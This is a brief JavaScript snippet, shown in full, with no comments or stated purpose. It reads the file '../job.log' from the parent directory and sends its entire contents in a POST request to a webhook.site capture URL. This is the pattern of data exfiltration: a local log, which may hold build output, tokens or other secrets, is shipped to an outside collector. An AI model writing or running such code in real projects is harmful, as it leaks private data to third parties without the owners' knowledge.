fs.readFile('../job.log', 'utf8', (err, data) => {
  if (err) {
    console.log(err);
    return;
  }

  const options = {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: data
  };

  console.log("sending");
  fetch("https://webhook.site/a4ba2caf-e528-46ab-933e-e21af028d76c/", options);
});

